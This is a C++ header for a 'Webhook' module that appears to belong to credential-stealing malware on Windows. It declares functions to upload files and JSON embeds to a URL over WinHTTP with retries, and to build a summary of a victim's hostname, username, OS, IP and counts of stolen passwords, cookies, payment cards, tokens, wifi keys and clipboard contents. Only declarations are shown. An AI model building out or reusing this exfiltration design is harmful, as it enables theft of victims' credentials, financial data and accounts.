 
#pragma once
#include <string>
#include <windows.h>
namespace Modules {
    class Webhook {
    public:
        // Call once before any Send* — creates persistent WinHTTP session
        static bool InitSession();
        // Call after all uploads are done
        static void CloseSession();

        static bool SendFile(const std::string& url, const std::string& content, const std::string& fileName);
        static bool SendEmbed(const std::string& url, const std::string& jsonPayload);
        static bool SendFileRetry(const std::string& url, const std::string& content, const std::string& fileName, int maxRetries = 3);
        static std::string BuildSummaryEmbed(
            const std::string& hostname, const std::string& username,
            const std::string& os, const std::string& ip,
            int passwords, int cookies, int cards, int tokens,
            int wifi, bool clipboard
        );
    };
}

